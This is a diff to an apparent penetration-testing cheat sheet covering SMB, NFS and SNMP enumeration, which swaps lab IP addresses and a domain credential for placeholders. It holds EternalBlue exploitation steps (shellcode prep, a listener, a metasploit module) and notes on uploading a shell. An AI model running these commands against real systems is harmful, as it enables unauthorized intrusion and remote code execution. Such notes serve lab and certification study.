@@ -95,7 +95,7 @@ nmap --script http-title <IP>
 
 Other usages
 ------------
-nmap -vvv -A --reason --script="+(safe or default) and not broadcat -p - <IP>"
+nmap -vvv -A --reason --script="+(safe or default) and not broadcast" -p - <IP>
 
 ```
 
@@ -146,31 +146,31 @@ copy \\<IP>\<share>\<file>                                            get files
 
 more enumeration
 ----------------
-sudo nmap -vvv -p 137 -sU --script=nbstat.nse 192.168.190.140
-nmap -vvv -p 139,445 --script=smb* 192.168.228.63
-crackmapexec smb 192.168.157.31 -u 'guest' -p ''
-crackmapexec smb 192.168.228.63 -u '' -p '' --shares
+sudo nmap -vvv -p 137 -sU --script=nbstat.nse <IP>
+nmap -vvv -p 139,445 --script=smb* <IP>
+crackmapexec smb <IP> -u 'guest' -p ''
+crackmapexec smb <IP> -u '' -p '' --shares
 - see anon logins
 - use flags --shares and --rid-brute
-smbclient \\\\\192.168.228.63\\
-smbclient -U 'Guest' -L \\\\\192.168.134.126\\
-smbclient --no-pass -L //192.168.203.172
-enum4linux -a -u "CRAFT2\\thecybergeek" -p "winniethepooh" 192.168.203.188
+smbclient \\\\\\<IP>\\
+smbclient -U 'Guest' -L \\\\\\<IP>\\
+smbclient --no-pass -L //<IP>
+enum4linux -a -u "<DOMAIN>\\<username>" -p "<password>" <IP>
 ```
 
 **Connect to a share**
 ```
-smbclient //192.168.134.126/print$
-smbclient \\\\\192.168.212.172\\Shenzi
-smbclient //192.168.203.172/DocumentsShare -U CRAFT2/thecybergeek
-mount -t cifs -o rw,username=guest,password= '//10.10.10.103/Department Shares' /mnt
+smbclient //<IP>/<share>
+smbclient \\\\\\<IP>\\<share>
+smbclient //<IP>/<share> -U <DOMAIN>/<username>
+mount -t cifs -o rw,username=<username>,password=<password> '//<IP>/<share>' /mnt
 ```
 
 **Use nmap to scan for the NetBIOS service**<br/>
-`nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254`
+`nmap -v -p 139,445 -oG smb.txt <IP-range>`
 
 **Use nbtscan to collect additional NetBIOS information**<br/>
-`sudo nbtscan -r 10.11.1.0/24`
+`sudo nbtscan -r <IP-range>`
 
 **Find various nmap SMB NSE scripts**<br/>
 `ls -1 /usr/share/nmap/scripts/smb*`<br/>
@@ -182,16 +182,16 @@ Example: `nmap -v -p 139, 445 --script=smb-os-discovery <IP>`
 
 **EternalBlue**
 - https://redteamzone.com/EternalBlue/
-- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 192.168.1.17`
+- `nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010 <IP>`
 - `sudo impacket-smbserver -smb2support share /home/kali/Documents/windows-attack/nc/`
 First option
-- `python 42315 10.10.10.4`
+- `python 42315 <TARGET_IP>`
   - exploit: https://www.exploit-db.com/exploits/42315
 Second option
 - With AutoBlue-MS17-010
   1. `cd shellcode` > `./shell_prep.sh`
   2. run a listener
-  3. `python eternalblue_exploit7.py 10.10.14.10 shellcode/sc_x64.bin`
+  3. `python eternalblue_exploit7.py <TARGET_IP> shellcode/sc_x64.bin`
 Third option
 - with metasploit
   - `use windows/smb/ms17_010_psexec`
@@ -201,15 +201,15 @@ Third option
   - Also when using `sudo impacket-smbserver -smb2support share .`
 - check if this smb hosts files of the web service, it might be possible to upload a shell
 - maybe it's possible to do phishing
-- nmap -Pn -p 139,445 --open --max-hostgroup 3 --script=smb-vuln* 10.10.10.4
+- `nmap -Pn -p 139,445 --open --max-hostgroup 3 --script=smb-vuln* <IP>`
 
 ## NFS Enumeration
 
 **Find and identify hosts that have portmapper/rpcbind running using nmap**<br/>
-`nmap -v -p 111 10.11.1.1-254`
+`nmap -v -p 111 <IP-range>`
 
 **Query rpcbind in order to get registered services**<br/>
-`nmap -sV -p 111 --script=rpcinfo 10.11.1.1-254`
+`nmap -sV -p 111 --script=rpcinfo <IP-range>`
 
 **Nmap NFS NSE Scripts**<br/>
 `ls -1 /usr/share/nmap/scripts/nfs*`<br/>
@@ -260,7 +260,7 @@ cat /etc/passwd | grep pwn                               Verify that the changes
    echo manager >> community
    ```
 2. Build a text file containing IP addresses to scan<br/>
-   `for ip in $(seq 1 254); do echo 192.168.45.$ip; done > ips`
+   `for ip in $(seq 1 254); do echo <SUBNET>.$ip; done > ips`
 3. Use [onesixtyone](https://github.com/trailofbits/onesixtyone)<br/>
    `onesixtyone -c community -i ips`
 
